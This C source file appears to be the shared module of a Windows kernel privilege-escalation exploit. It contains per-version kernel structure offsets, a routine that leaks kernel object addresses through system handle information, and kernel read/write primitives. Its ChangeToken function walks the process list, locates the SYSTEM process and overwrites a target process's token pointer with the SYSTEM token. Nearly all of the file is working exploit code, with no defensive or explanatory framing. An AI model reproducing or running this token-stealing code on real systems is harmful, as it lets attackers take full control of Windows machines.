#include "Commons.h"
#include <Shlwapi.h>

const ULONG _APL_OFFS[WIN_MAX] = 
	{0, 0x188,																		// 7
	 0, 0x2F0, 0, 0x2F0,															// 8, 8.1
	 0, 0x2F0, 0, 0x2F0, 0, 0x2F0, 0, 0x2F0, 0, 0x2F0,								// 1507, 1511, 1607, 1703, 1709
	 0, 0x2F0, 0, 0x2F0, 0, 0x2F0, 0, 0x2F0, 										// 1803, 1809, 1903, 1909
	 0, 0x450, 0, 0x450, 0, 0x458};													// 2004, 20H2, 21H1

const ULONG _PM_OFFS[WIN_MAX] = 
	{0, 0x1F6,																		// 7
	 0, 0x232, 0, 0x232,															// 8, 8.1
	 0, 0x232, 0, 0x232, 0, 0x232, 0, 0x232, 0, 0x232,								// 1507, 1511, 1607, 1703, 1709
	 0, 0x232, 0, 0x232, 0, 0x232, 0, 0x232, 										// 1803, 1809, 1903, 1909
	 0, 0x232, 0, 0x232, 0, 0x232};													// 2004, 20H2, 21H1

const ULONG _EP_OFFS[WIN_MAX] = 
	{0, 0x210,																		// 7
	 0, 0x220, 0, 0x220,															// 8, 8.1
	 0, 0x220, 0, 0x220, 0, 0x220, 0, 0x220, 0, 0x220,								// 1507, 1511, 1607, 1703, 1709
	 0, 0x220, 0, 0x220, 0, 0x220, 0, 0x220, 										// 1803, 1809, 1903, 1909
	 0, 0x220, 0, 0x220, 0, 0x220};													// 2004, 20H2, 21H1

INTERNAL_PROCESS_OFFSETS ipo = {0};

ULONG uSystem		= WIN_UNKNOWN;
BOOL  bWin11		= FALSE;
BOOL  bWin11_22621	= FALSE;
BOOL  bSystemX64	= FALSE;
BOOL  bServer		= FALSE;

ULONG uRndSeed = 0;
ULONG_PTR MyRand()
{
	if (uRndSeed == 0)
	{
		uRndSeed = GetTickCount() + (ULONG)__rdtsc();
	}

	return ((ULONG_PTR)RtlRandomEx(&uRndSeed)*0x100000000 + RtlRandomEx(&uRndSeed));
}

BOOL GetWindowsVersion(DWORD* Major, DWORD* Minor)
{	
	PCHAR pMzNtDll = (PCHAR)GetModuleHandleA("ntdll.dll");
	if (pMzNtDll != NULL)
	{
		PIMAGE_NT_HEADERS pPeNtDll = (PIMAGE_NT_HEADERS)(pMzNtDll + ((PIMAGE_DOS_HEADER)pMzNtDll)->e_lfanew);

		*Major = (DWORD)pPeNtDll->OptionalHeader.MajorOperatingSystemVersion;
		*Minor = (DWORD)pPeNtDll->OptionalHeader.MinorOperatingSystemVersion;

		return TRUE;
	}

	return FALSE;
}

__declspec(noinline) BOOL ReadRegistryValue(LPWSTR Key, LPWSTR Parameter, PUCHAR Value, ULONG Length)
{
	BOOL bRes  = FALSE;
	ULONG uLen = 0;

	HANDLE			  hKey = NULL;
	UNICODE_STRING	  KeyName;
	UNICODE_STRING	  ParamName;
	OBJECT_ATTRIBUTES ObjectAttributes;
	
	RtlInitUnicodeString(&KeyName, Key);
	RtlInitUnicodeString(&ParamName, Parameter);

	InitializeObjectAttributes(&ObjectAttributes, &KeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	
	memset(Value, 0, Length);

	if (NT_SUCCESS(NtOpenKey(&hKey, KEY_READ, &ObjectAttributes)))
	{
		if (NT_SUCCESS(NtQueryValueKey(hKey, &ParamName, KeyValuePartialInformation, Value, Length, &uLen)))
		{
			bRes = TRUE;
		}

		NtClose(hKey);
	}

	return bRes;
}


BOOL InitInternal()
{
	DWORD dwMajorVersion = 0;
	DWORD dwMinorVersion = 0;
	BOOL IsWow64		 = FALSE;

	if (GetWindowsVersion(&dwMajorVersion, &dwMinorVersion))
	{
		if (dwMajorVersion == 6 && dwMinorVersion == 1) 
		{
			uSystem = WIN_7_X64;
		}
		else if (dwMajorVersion == 6 && dwMinorVersion == 2) 
		{
			uSystem = WIN_8_X64;
		}
		else if (dwMajorVersion == 6 && dwMinorVersion == 3) 
		{
			uSystem = WIN_81_X64;
		}
		else if (dwMajorVersion == 10) 
		{
			DWORD dwType = REG_SZ;
			MY_KEY_VALUE_PARTIAL_INFORMATION Reg;
			
			if (ReadRegistryValue(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", (PUCHAR)&Reg, sizeof(Reg)))
			{
				ULONG_PTR uVer = *(PULONG_PTR)(&Reg.Data[0]);
				
				if (uVer == 0x0031003100350031)
				{
					uSystem = WIN_10_1511_X64;
				}
				else if (uVer == 0x0037003000350031)		// 1507
				{
					uSystem = WIN_10_1507_X64;
				}
				else if (uVer == 0x0037003000360031)		// 1607
				{
					uSystem = WIN_10_1607_X64;
				}
				else if (uVer == 0x0033003000370031)		// 1703
				{
					uSystem = WIN_10_1703_X64;
				}
				else if (uVer == 0x0039003000370031)		// 1709
				{
					uSystem = WIN_10_1709_X64;
				}
				else if (uVer == 0x0033003000380031)		// 1803
				{
					uSystem = WIN_10_1803_X64;
				}
				else if (uVer == 0x0039003000380031)		// 1809
				{
					uSystem = WIN_10_1809_X64;
				}
				else if (uVer == 0x0033003000390031)		// 1903
				{
					uSystem = WIN_10_1903_X64;
				}
				else if (uVer == 0x0039003000390031)		// 1909
				{
					uSystem = WIN_10_1909_X64;
				}
				else if (uVer == 0x0034003000300032)		// 2004
				{
					uSystem = WIN_10_2004_X64;
				}
				else if (uVer == 0x0039003000300032)		// 2009
				{
					uSystem = WIN_10_20H2_X64;
				}
			}
			else 
			{
				if (ReadRegistryValue(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CurrentBuild", (PUCHAR)&Reg, sizeof(Reg)))
				{
					ULONG_PTR uVer = uVer = *(PULONG_PTR)(&Reg.Data[0]);

					if (uVer == 0x0034003200300031)	
					{
						uSystem = WIN_10_1507_X64;
					}
					else
					{
						return FALSE;
					}
				}
				else
				{
					return FALSE;
				}
			}
		}
		else 
		{
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}

	ipo.ActiveProcessLinks = _APL_OFFS[uSystem];
	ipo.PreviousMode	   = _PM_OFFS[uSystem];
	ipo.Eprocess		   = _EP_OFFS[uSystem];

	return TRUE;
}

BOOL InitInternal2()
{
	BOOL bRes = FALSE;
	RTL_OSVERSIONINFOW osvi = {0};

	if (RtlGetVersion != 0 && NT_SUCCESS(RtlGetVersion(&osvi)) && osvi.dwMajorVersion == 10)
	{
		uSystem = WIN_10_1507_X64;

		if (osvi.dwBuildNumber == 10586)
			uSystem = WIN_10_1511_X64;
		else if (osvi.dwBuildNumber == 14393)
			uSystem = WIN_10_1607_X64;
		else if (osvi.dwBuildNumber == 15063)
			uSystem = WIN_10_1703_X64;
		else if (osvi.dwBuildNumber == 16299)
			uSystem = WIN_10_1709_X64;
		else if (osvi.dwBuildNumber == 17134 || osvi.dwBuildNumber == 17623)
			uSystem = WIN_10_1803_X64;
		else if (osvi.dwBuildNumber == 17763)
			uSystem = WIN_10_1809_X64;
		else if (osvi.dwBuildNumber == 18362)
			uSystem = WIN_10_1903_X64;
		else if (osvi.dwBuildNumber == 18363)
			uSystem = WIN_10_1909_X64;
		else if (osvi.dwBuildNumber == 19041)
			uSystem = WIN_10_2004_X64;
		else if (osvi.dwBuildNumber == 19042)
			uSystem = WIN_10_20H2_X64;
		else if (osvi.dwBuildNumber == 19043)
			uSystem = WIN_10_21H1_X64;
		else if ((osvi.dwBuildNumber >= 19044) && (osvi.dwBuildNumber < 22000))
			uSystem = WIN_10_21H1_X64;
		else if (osvi.dwBuildNumber >= 22000)
		{
			uSystem = WIN_10_21H1_X64;
			//bWin11 = TRUE;

			if (osvi.dwBuildNumber == 22621)
			{
				bWin11_22621 = TRUE;
			}
		}
		
		ipo.ActiveProcessLinks = _APL_OFFS[uSystem];
		ipo.PreviousMode	   = _PM_OFFS[uSystem];
		ipo.Eprocess		   = _EP_OFFS[uSystem];

		bRes = TRUE;
	}

	return bRes;
}

LPVOID pSysInfo		  = 0;
ULONG  uSysInfoLength = 0;
__declspec(noinline) PVOID FindObjectByHandle(ULONG uProcessId, HANDLE Handle, BOOL bObjectTypeIndex)
{
	PVOID pRes		 = 0;
	ULONG uOutLength = 0;
	
	if (pSysInfo == 0)
	{
		uSysInfoLength = 0x10000000;
		do 
		{
			uSysInfoLength /= 2;
			pSysInfo = VirtualAlloc(NULL, uSysInfoLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		} while (pSysInfo == 0);
	}

	if (uProcessId == 0 || uProcessId == (ULONG)-1) uProcessId = GetCurrentProcessId();

	if (pSysInfo != 0)
	{
		ULONG i = 0;
		PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX pHandles = 0;
		
		NTSTATUS Status = NtQuerySystemInformation(SystemExtendedHandleInformation, pSysInfo, uSysInfoLength, &uOutLength);

		if (NT_SUCCESS(Status))
		{
			pHandles = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)((PBYTE)pSysInfo + (ULONG_PTR)(((PSYSTEM_HANDLE_INFORMATION_EX)0)->Handles));
			for (i = 0; i < *(PULONG)pSysInfo; ++i)
			{
				if (pHandles[i].UniqueProcessId == (HANDLE)(ULONG_PTR)uProcessId && pHandles[i].HandleValue == Handle)
				{
					if (!bObjectTypeIndex)
					{
						pRes = (PBYTE)pHandles[i].Object;
					}
					else
					{
						pRes = (PBYTE)pHandles[i].ObjectTypeIndex;
					}
				
					break;
				}
			}
		}

		//VirtualFree(pSysInfo, 0, MEM_RELEASE);
	}

	return pRes;
}

/////////////////////////////////////////  Kernel Read/Write Primitives  /////////////////////////////////////////
VOID SetKernelValue(ULONG_PTR pAddr, ULONG_PTR pVal)
{
	if (pAddr < 0x7fffffff0000)			// MmUserProbeAddress
	{
		*(PULONG_PTR)pAddr = pVal;
	}
	else
	{
		NtWriteVirtualMemory((HANDLE)-1, (PVOID)pAddr, &pVal, 8, 0);
	}

	return;
}

ULONG_PTR GetKernelValue(ULONG_PTR pAddr)
{
	ULONG_PTR uRes = 0;

	if (NT_SUCCESS(NtReadVirtualMemory((HANDLE)-1, (PVOID)pAddr, &uRes, 8, 0)))
	{
		return uRes;
	}
	else
	{
		return ERROR_READ_KERNEL;
	}
}
/////////////////////////////////////////  Kernel Read/Write Primitives  /////////////////////////////////////////

__declspec(noinline) BOOL ChangeToken(DWORD dPid, ULONG_PTR pThread)
{
	BOOL bRes = FALSE; 

	ULONG i = 0;
	
	ULONG uCurrentActiveProcessLinksOffset	= 0;
	ULONG uTokenOffset = 0;

	ULONG_PTR ptagPROCESSINFO = 0;
	ULONG_PTR ppMyToken		  = 0;
	ULONG_PTR pMyToken		  = 0;
	ULONG_PTR ppSystemToken	  = 0;
	ULONG_PTR pSystemToken	  = 0;
	ULONG_PTR uCounter		  = 0;
	ULONG_PTR pCls			  = 0;
	ULONG_PTR pDesk			  = 0;
	ULONG_PTR pMyThreadInfo   = 0;
	ULONG_PTR pEPROCESS		  = 0;
	
	ULONG uIterations = 0;

	pEPROCESS = GetKernelValue(pThread + ipo.Eprocess);
	
	if (uCurrentActiveProcessLinksOffset == 0)
	{
		ULONG_PTR uPid = (ULONG_PTR)GetCurrentProcessId();
		uCurrentActiveProcessLinksOffset = ipo.ActiveProcessLinks;

		while (uCurrentActiveProcessLinksOffset != 0)
		{
			if (GetKernelValue(pEPROCESS + uCurrentActiveProcessLinksOffset - sizeof(PVOID)) == uPid)
			{
				break;
			}
			uCurrentActiveProcessLinksOffset -= sizeof(PVOID);
		}
	}

	while (TRUE)
	{
		++uIterations;
		if (uIterations > 0x1000) return FALSE;

		pEPROCESS = GetKernelValue(pEPROCESS + uCurrentActiveProcessLinksOffset) - uCurrentActiveProcessLinksOffset;
		if (GetKernelValue(pEPROCESS + uCurrentActiveProcessLinksOffset - sizeof(PVOID)) == (ULONG_PTR)0x04)
		{
			pSystemToken = GetKernelValue(pEPROCESS + uTokenOffset);

			while (pSystemToken < MAXLONG_PTR || (DWORD)GetKernelValue(pSystemToken & (~(2*sizeof(PVOID) - 1))) != 'SYS*')
			{
				++uIterations;
				if (uIterations > 0x1000) return FALSE;

				uTokenOffset += sizeof(PVOID);
				pSystemToken = GetKernelValue(pEPROCESS + uTokenOffset);
			}
			break;
		}
	}

	while (TRUE)
	{
		++uIterations;
		if (uIterations > 0x1000) return FALSE;

		pEPROCESS = GetKernelValue(pEPROCESS + uCurrentActiveProcessLinksOffset) - uCurrentActiveProcessLinksOffset;
		
		if (GetKernelValue(pEPROCESS + uCurrentActiveProcessLinksOffset - sizeof(PVOID)) == (ULONG_PTR)dPid)
		{
			ppMyToken = pEPROCESS + uTokenOffset;
			pMyToken = GetKernelValue(ppMyToken);
	
			break;
		}
	}

#ifdef _WIN64
	uCounter = GetKernelValue((pSystemToken & 0xFFFFFFFFFFFFFFF0) - 6*sizeof(PVOID));
	SetKernelValue((pSystemToken & 0xFFFFFFFFFFFFFFF0) - 6*sizeof(PVOID), uCounter + 0x10);

	bRes = TRUE;
#else
	uCounter = GetKernelValue((pSystemToken & 0xFFFFFFF8) - 6*sizeof(PVOID));
	SetKernelValue((pSystemToken & 0xFFFFFFFFFFFFFFF8) - 6*sizeof(PVOID), uCounter + 0x10);

	bRes = TRUE;
#endif
	SetKernelValue(ppMyToken, pSystemToken & (~(2*sizeof(PVOID) - 1)));
	
	return bRes;
}

